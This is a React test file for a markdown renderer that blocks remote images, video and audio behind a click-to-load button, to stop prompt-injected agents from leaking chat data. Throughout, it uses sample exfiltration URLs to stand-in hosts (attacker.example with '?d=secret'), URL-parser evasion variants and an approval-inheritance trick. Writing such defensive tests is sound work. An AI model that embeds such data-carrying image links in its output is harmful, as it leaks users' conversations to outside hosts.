import { describe, it, expect } from 'vitest'
import { render, fireEvent } from '@testing-library/react'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import MarkdownRenderer from '../components/MarkdownRenderer'

/**
 * SECURITY GUARD — deferred remote images (rfc-redaction-explain-and-reveal §5).
 *
 * Agent-written markdown is untrusted, and an auto-loading
 * `<img src="https://…?d=<data>">` is a zero-click request: the browser sends
 * it the moment the message renders, so a prompt-injected agent can exfiltrate
 * conversation data through the URL with nobody clicking anything.
 *
 * By default, a remote http(s) image must render as a click-to-load
 * placeholder — NO `<img>` element, hence
 * no request — until the user explicitly clicks. Local images (`/api/file-raw`
 * same-origin reads) are unaffected: they make no outbound request, and
 * deferring them would only add friction to the dominant screenshot case.
 */

describe('deferRemoteImages', () => {
  it('a remote image renders a placeholder button, not an <img>', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'![chart](https://evil.example.com/x.png?d=c2VjcmV0)'}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    const btn = container.querySelector('button')
    expect(btn).not.toBeNull()
    // The URL is duplicated in the title, but every approval fact is visible
    // in the button's rendered flow for keyboard and touch users.
    expect(btn!.getAttribute('title')).toBe('https://evil.example.com/x.png?d=c2VjcmV0')
    // Order in the rendered flow: icon, action label, then the disclosure —
    // the host is the value of a labelled fact rather than a bare token on the
    // action row (where it read as a separate, possibly-clickable link).
    expect(btn!.children[1].textContent).toContain('click to load')
    expect(btn!.children[2].textContent).toContain('Site:')
    expect(btn!.children[2].textContent).toContain('evil.example.com')
    expect(getByText('For privacy, loads only this file from the site shown, one time.')).toBe(btn!.children[3])
    expect(getByText('Described in the message as: “chart”')).toBe(btn!.lastElementChild)
    // ONE consequence line. The second ("Other external content stays
    // blocked.") restated the scope the word "only" already carries, and the
    // pair repeated under every chip in a reply.
    expect(btn!.textContent).not.toContain('stays blocked')
  })

  it('clicking the placeholder loads the image', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![chart](https://example.com/chart.png)'}
      />,
    )
    fireEvent.click(container.querySelector('button')!)
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.src).toBe('https://example.com/chart.png')
  })

  it('a local image still loads automatically under deferRemoteImages', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![shot](/tmp/evidence/after.png)'}
      />,
    )
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toContain('/api/file-raw')
  })

  it('a data image is stripped by the pre-existing markdown URL transform', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'![inline](data:image/png;base64,iVBORw0KGgo=)'}
      />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).toBeNull()
  })

  it.each([
    ['absolute', `${window.location.origin}/api/link-meta?url=https://attacker.example/?d=secret`],
    ['root-relative', '/api/link-meta?url=https://attacker.example/?d=secret'],
    ['relative', 'api/link-meta?url=https://attacker.example/?d=secret'],
  ])('a same-origin %s gateway URL is refused with no button', (_kind, src) => {
    // The chip could only name the dashboard's own host, not the site the
    // gateway would then fetch, so there is nothing honest to consent to.
    const { container, getByTestId } = render(
      <MarkdownRenderer content={`![same origin proxy](${src})`} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).toBeNull()
    expect(getByTestId('remote-media-gateway-refused').textContent).toMatch(/can't be shown/)
  })

  it('a video whose source is a gateway route is refused with no button', () => {
    const { container, getByTestId } = render(
      <MarkdownRenderer content={'<video controls src="/api/link-meta?url=https://attacker.example/v.mp4"></video>'} />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')).toBeNull()
    expect(getByTestId('remote-media-gateway-refused')).toBeTruthy()
  })

  it('the local file-bytes route does not defer', () => {
    const { container } = render(
      <MarkdownRenderer content={'![local bytes](/api/file-raw?path=x.png)'} />,
    )
    const img = container.querySelector('img') as HTMLImageElement | null
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe('/api/file-raw?path=x.png')
    expect(container.querySelector('button')).toBeNull()
  })

  it('remote images defer by default', () => {
    const { container } = render(
      <MarkdownRenderer content={'![chart](https://example.com/chart.png)'} />,
    )
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('the destination host stays primary and alt text is a quoted secondary line', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'![Quarterly chart](https://attacker.example/pixel?d=x)'}
      />,
    )
    const button = container.querySelector('button')!
    expect(button.textContent).toContain('attacker.example')
    const description = getByText('Described in the message as: “Quarterly chart”')
    expect(description.classList).toContain('basis-full')
    expect(description.classList).toContain('text-muted')
    expect(button.getAttribute('title')).toBe('https://attacker.example/pixel?d=x')
  })

  it('omits the model-description line when alt text is absent', () => {
    const { container } = render(
      <MarkdownRenderer content={'![](https://attacker.example/pixel?d=x)'} />,
    )
    expect(container.querySelector('button')!.textContent).not.toContain('Described in the message as:')
  })

  it.each([
    ['image', '![chart](https://attacker.example/pixel.png)', 'External image blocked — click to load'],
    ['video', '<video controls src="https://attacker.example/video.mp4"></video>', 'External video blocked — click to load'],
    ['audio', '<audio controls src="https://attacker.example/track.mp3"></audio>', 'External audio blocked — click to load'],
  ])('the deferred %s control is one wrapping button with visible safety facts', (_kind, content, label) => {
    const { container, getByText } = render(<MarkdownRenderer content={content} />)
    expect(container.querySelectorAll('button')).toHaveLength(1)
    const button = container.querySelector('button')!
    expect(button.classList).toContain('flex-wrap')
    // Affordance AT REST, not only on hover: a reader of the earlier
    // hairline-on-flat chip could not tell what was clickable. The boundary and
    // the raised surface are resting classes; hover only strengthens them.
    expect(button.classList).toContain('border-border-strong')
    expect(button.classList).toContain('bg-bg-hover')
    expect(button.classList).toContain('cursor-pointer')
    expect(button.classList).not.toContain('border-border')
    const host = getByText('attacker.example')
    expect(host.classList).toContain('break-all')
    expect(host.classList).not.toContain('truncate')
    const action = getByText(label)
    // The action label is calm primary text at rest (never link-green, which in
    // this renderer means a hyperlink) and only hints the accent on hover — the
    // whole chip is the button, not a link.
    expect(action.classList).toContain('text-text')
    expect(action.classList).toContain('group-hover/remote-media:text-accent')
    expect(action.classList).not.toContain('underline')
    const consequences = [
      getByText('For privacy, loads only this file from the site shown, one time.'),
    ]
    expect(button.getAttribute('title')).toBe(
      { image: 'https://attacker.example/pixel.png',
        video: 'https://attacker.example/video.mp4',
        audio: 'https://attacker.example/track.mp3' }[_kind as 'image' | 'video' | 'audio'],
    )
    for (const consequence of consequences) {
      expect(consequence.classList).toContain('block')
      expect(consequence.classList).toContain('basis-full')
      expect(consequence.classList).toContain('text-muted')
    }
    for (const element of button.querySelectorAll('*')) {
      expect(element.classList).not.toContain('border-s')
      expect(element.classList).not.toContain('underline')
      expect(element.classList).not.toContain('decoration-dotted')
      expect(element.classList).not.toContain('min-w-0')
      expect(element.classList).not.toContain('truncate')
    }
  })

  it('approving a link-wrapped image does not navigate the link', () => {
    // [![alt](img)](href): the approval click must not fall through to the
    // (equally model-authored) anchor around it.
    const { container } = render(
      <MarkdownRenderer
        content={'[![chart](https://images.example/x.png)](https://attacker.example/landing)'}
      />,
    )
    const btn = container.querySelector('button')!
    // fireEvent returns false when preventDefault was called on the event.
    const notPrevented = fireEvent.click(btn)
    expect(notPrevented).toBe(false)
    expect(container.querySelector('img')).not.toBeNull()
  })

  it('an approved remote image is fetched with no referrer', () => {
    // The approval binds the request this renderer initiates; a server can
    // still redirect it onward. The redirect target must not also learn which
    // page the media was embedded in, so the approved fetch carries no
    // referrer. Local images keep the default (nothing leaves the host).
    const remote = render(<MarkdownRenderer content={'![chart](https://images.example/x.png)'} />)
    fireEvent.click(remote.container.querySelector('button')!)
    expect(remote.container.querySelector('img')!.getAttribute('referrerpolicy')).toBe('no-referrer')

    const local = render(<MarkdownRenderer content={'![chart](/tmp/x.png)'} />)
    expect(local.container.querySelector('button')).toBeNull()
    expect(local.container.querySelector('img')!.getAttribute('referrerpolicy')).toBeNull()
  })

  it('an approved remote media element carries no referrerPolicy attribute', () => {
    // Not an omission: referrerPolicy is a content attribute of
    // a/area/img/iframe/link/script only. A media element has no per-element
    // equivalent, so asserting one here would pin a no-op onto the DOM and
    // imply a mitigation the platform does not offer.
    const { container } = render(
      <MarkdownRenderer content={'<video controls src="https://images.example/v.mp4"></video>'} />,
    )
    fireEvent.click(container.querySelector('button')!)
    const video = container.querySelector('video')!
    expect(video).not.toBeNull()
    expect(video.getAttribute('referrerpolicy')).toBeNull()
  })

  it('the approval signature is injective, so a newline in a URL cannot inherit approval', () => {
    // A delimiter join is not injective: ['a\nb'] and ['a','b'] share one
    // join('\n'), and an HTML attribute may carry a newline. Two different
    // remote sets with one signature is approval inheritance — this gate's own
    // failure mode. Approve the one-URL-with-a-newline form, then swap to the
    // two-URL form that would collide under a join: the gate must re-arm.
    const withNewline = '<video controls src="https://a.example/x.mp4\nhttps://b.example/y.mp4"></video>'
    const twoUrls = '<video controls src="https://a.example/x.mp4" poster="https://b.example/y.mp4"></video>'
    const { container, rerender } = render(<MarkdownRenderer content={withNewline} />)
    const first = container.querySelector('button')
    if (first) fireEvent.click(first)
    rerender(<MarkdownRenderer content={twoUrls} />)
    // Whatever the first form resolved to, the second must still be gated:
    // no <video> may mount without its own click.
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('a raw-HTML <video poster> defers like an image', () => {
    // The sanitizer's allowlist admits video/audio/source, whose poster/src
    // the browser fetches on mount — the same zero-click request the img
    // gate stops, so the same chip must gate it.
    const { container } = render(
      <MarkdownRenderer
        content={'<video controls poster="https://images.example/pixel?d=x" src="https://attacker.example/v.mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    const btn = container.querySelector('button')
    expect(btn).not.toBeNull()
    expect(btn!.textContent).toContain('attacker.example')
    expect(btn!.textContent).toContain('images.example')
    expect(btn!.textContent).toContain('For privacy, loads only these files from the sites shown, one time.')
    expect(btn!.textContent).not.toContain('stays blocked')
    expect(btn!.querySelector('.lucide-film')).not.toBeNull()
    expect(btn!.getAttribute('title')).toBe(
      'https://attacker.example/v.mp4\nhttps://images.example/pixel?d=x',
    )
    fireEvent.click(btn!)
    expect(container.querySelector('video')).not.toBeNull()
  })

  it('a remote <source> outside an approved media element is dropped', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<picture><source srcset="https://attacker.example/x.webp" type="image/webp"><img src="https://images.example/x.png" alt="pic"></picture>'}
      />,
    )
    expect(container.querySelector('source')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
  })

  it('a bare remote <source src> is dropped too', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<video controls><source src="https://attacker.example/v.mp4" type="video/mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('source')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('a raw-HTML <audio src> defers like an image', () => {
    const { container } = render(
      <MarkdownRenderer
        content={'<audio controls src="https://attacker.example/a.mp3"></audio>'}
      />,
    )
    expect(container.querySelector('audio')).toBeNull()
    const btn = container.querySelector('button')!
    expect(btn.querySelector('.lucide-volume-2')).not.toBeNull()
    expect(btn.textContent).toContain('For privacy, loads only this file from the site shown, one time.')
    fireEvent.click(btn)
    expect(container.querySelector('audio')).not.toBeNull()
  })

  it('a media description is visible and quoted without entering the host slot', () => {
    const { container, getByText } = render(
      <MarkdownRenderer
        content={'<audio controls title="Quarterly narration" src="https://attacker.example/a.mp3"></audio>'}
      />,
    )
    const button = container.querySelector('button')!
    expect(getByText('Described in the message as: “Quarterly narration”').classList).toContain('text-muted')
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual(['attacker.example'])
    expect(button.getAttribute('title')).toBe('https://attacker.example/a.mp3')
  })

  it.each([
    ['mixed slash/backslash', 'https:/\\attacker.example/pixel'],
    ['protocol-relative', '//attacker.example/pixel'],
    ['slash-less special scheme', 'https:attacker.example/pixel'],
  ])('a %s poster URL is still classified remote', (_name, url) => {
    // The browser's URL parser normalizes all of these to a remote fetch of
    // attacker.example; the gate must classify with the SAME parser, or the
    // form the regex misses is exactly the form the exfiltration uses.
    const { container } = render(
      <MarkdownRenderer
        content={`<video controls poster="${url}"></video>`}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')).not.toBeNull()
  })

  it('provenance survives the click, and a local image never claims a site', () => {
    // A loaded remote image is pixel-identical to a local one, so without a
    // caption the only record of the network fetch is a chip that no longer
    // exists — including for a reader who returns to the conversation later.
    const { container } = render(<MarkdownRenderer content={'<img src="https://metrics.example/c.png">'} />)
    fireEvent.click(container.querySelector('button')!)
    expect(container.querySelector('button')).toBeNull()
    expect(container.querySelector('img')).not.toBeNull()
    expect(container.textContent).toContain('metrics.example')

    const local = render(<MarkdownRenderer content={'![local](/tmp/c.png)'} />)
    expect(local.container.querySelector('img')).not.toBeNull()
    expect(local.container.textContent).not.toContain('Site:')
  })

  it('a nested picture source cannot ride a locally-sourced player', () => {
    // `picture` and `source` are admitted tags, so a remote source can sit one
    // level below the media element. A collector that stopped at direct children
    // left `remotes` empty, the gate never rendered, and the mount branch then
    // published approval — `<picture>` resource selection fetched the remote URL
    // on render, which is the zero-click fetch this gate exists to stop.
    const { container } = render(
      <MarkdownRenderer
        content={
          '<video controls><picture><source srcset="https://attacker.example/p.png">'
          + '<img src="/api/file-raw?path=ok.png"></picture></video>'
        }
      />,
    )

    // Gated: a button, no player, and the attacker host disclosed on the chip.
    expect(container.querySelector('video')).toBeNull()
    const btn = container.querySelector('button')
    expect(btn).not.toBeNull()
    expect(btn!.textContent).toContain('attacker.example')
    expect(container.querySelector('source')).toBeNull()
  })

  it('a player with nothing remote mounts without claiming a host', () => {
    // The caption states where a fetch went. A local file was never fetched from
    // a host, so an empty "Loaded from" would assert a request that never
    // happened.
    const { container } = render(
      <MarkdownRenderer content={'<video controls src="/api/file-raw?path=clip.mp4"></video>'} />,
    )

    expect(container.querySelector('video')).not.toBeNull()
    expect(container.querySelector('button')).toBeNull()
    expect(container.textContent).not.toContain('Loaded from')
  })

  it('states the host in the past tense once the fetch has happened', () => {
    // The same host carries two different facts either side of the click: on the
    // chip it is where the file WOULD be fetched from, under a mounted element it
    // is where the file DID come from. One string for both reads as the first
    // sense in a place that means the second.
    const { container } = render(<MarkdownRenderer content={'<img src="https://metrics.example/c.png">'} />)
    expect(container.textContent).toContain('Site:')
    expect(container.textContent).not.toContain('Loaded from')

    fireEvent.click(container.querySelector('button')!)
    expect(container.textContent).toContain('Loaded from')
    expect(container.textContent).not.toContain('Site:')
  })

  it('states the past tense under an approved player too, for every host it reached', () => {
    // The same change has to land on DeferredMedia as well as ImgWithFallback:
    // they share the chip, the collector and the signature, but they are still
    // two functions, and a caption fixed in one is invisible in the other.
    const { container } = render(
      <MarkdownRenderer
        content={'<video controls src="https://cdn-a.example/v.mp4" poster="https://cdn-b.example/p.png"></video>'}
      />,
    )
    expect(container.textContent).toContain('Sites:')

    fireEvent.click(container.querySelector('button')!)
    expect(container.querySelector('video')).not.toBeNull()
    expect(container.textContent).toContain('Loaded from')
    expect(container.textContent).toContain('cdn-a.example')
    expect(container.textContent).toContain('cdn-b.example')
    expect(container.textContent).not.toContain('Sites:')
  })

  it('approval hands focus to the element that replaces the button', () => {
    // The approving button UNMOUNTS, so without a hand-off a keyboard user is
    // left focused on nothing: the browser falls back to <body> and the next Tab
    // restarts at the top of a transcript that can be hundreds of messages long.
    const { container } = render(<MarkdownRenderer content={'<img src="https://a.example/1.png" alt="chart">'} />)
    const button = container.querySelector('button')!
    button.focus()
    expect(document.activeElement).toBe(button)
    fireEvent.click(button)
    expect(container.querySelector('button')).toBeNull()
    const wrapper = container.querySelector('span.relative.block')!
    expect(wrapper.getAttribute('tabindex')).toBe('-1')
    expect(document.activeElement).toBe(wrapper)
  })

  it('an element that mounts already approved does not steal focus', () => {
    // A local image, or a remote one re-rendering after the message scrolled
    // back into view, must leave focus wherever the user actually is.
    const probe = document.createElement('button')
    document.body.appendChild(probe)
    probe.focus()
    render(<MarkdownRenderer content={'![local](/tmp/chart.png)'} />)
    expect(document.activeElement).toBe(probe)
    probe.remove()
  })

  it('the hover highlight is scoped to its own chip, not to an ancestor group', () => {
    // A bare `group` + `group-hover:` pair is satisfied by ANY hovered ancestor
    // carrying `group`, and the message wrapper carries one -- so a pointer
    // anywhere in the message lit every chip's label. The name is what confines
    // the highlight to the chip the pointer is actually on.
    const { container } = render(
      <MarkdownRenderer content={'<img src="https://a.example/1.png"><img src="https://b.example/2.png">'} />,
    )
    const buttons = [...container.querySelectorAll('button')]
    expect(buttons).toHaveLength(2)
    for (const button of buttons) {
      expect(button.className).toContain('group/remote-media')
      // an unnamed `group` token would re-open the ancestor match
      expect(button.className.split(/\s+/)).not.toContain('group')
      const label = button.querySelector('.font-medium')!
      expect(label.className).toContain('group-hover/remote-media:text-accent')
      expect(label.className).not.toMatch(/(^|\s)group-hover:/)
    }
  })

  it('one collected remote set drives every disclosed host and approval reset', () => {
    const first = '<video controls src="https://benign.example/v.mp4" poster="https://attacker.example/pixel.png"></video>'
    const second = '<video controls src="https://benign.example/v.mp4" poster="https://swapped.example/pixel.png"></video>'
    const { container, rerender } = render(<MarkdownRenderer content={first} />)
    let button = container.querySelector('button')!
    // Label and hosts share ONE translatable sentence, so the hosts arrive as a
    // single interpolated node rather than a span each.
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual([
      'benign.example, attacker.example',
    ])
    expect(button.getAttribute('title')).toBe(
      'https://benign.example/v.mp4\nhttps://attacker.example/pixel.png',
    )

    fireEvent.click(button)
    expect(container.querySelector('video')).not.toBeNull()
    rerender(<MarkdownRenderer content={second} />)

    expect(container.querySelector('video')).toBeNull()
    button = container.querySelector('button')!
    expect([...button.querySelectorAll('.break-all')].map(node => node.textContent)).toEqual([
      'benign.example, swapped.example',
    ])
  })

  it('the renderer exposes no remote-media deferral opt-out — no prop, no context', () => {
    const source = readFileSync(
      join(__dirname, '../components/MarkdownRenderer.tsx'),
      'utf8',
    )
    expect(source).not.toMatch(/\bdeferRemoteImages\b/)
    // Round 8: the context itself is deleted — deferral is unconditional
    // inline, so no future file can import a knob to consume.
    expect(source).not.toMatch(/\bDeferRemoteImagesCtx\b/)
  })

  it('media approval does not survive a URL swap at the same position', () => {
    // A streaming message re-renders in place, so React reuses the component
    // instance; approving URL X must not silently mount a swapped-in URL Y —
    // that would be the zero-click fetch the gate exists to stop.
    const { container, rerender } = render(
      <MarkdownRenderer
        content={'<video controls src="https://a.example/v.mp4"></video>'}
      />,
    )
    fireEvent.click(container.querySelector('button')!)
    expect(container.querySelector('video')).not.toBeNull()
    rerender(
      <MarkdownRenderer
        content={'<video controls src="https://b.example/v.mp4"></video>'}
      />,
    )
    expect(container.querySelector('video')).toBeNull()
    expect(container.querySelector('button')!.textContent).toContain('b.example')
  })
})
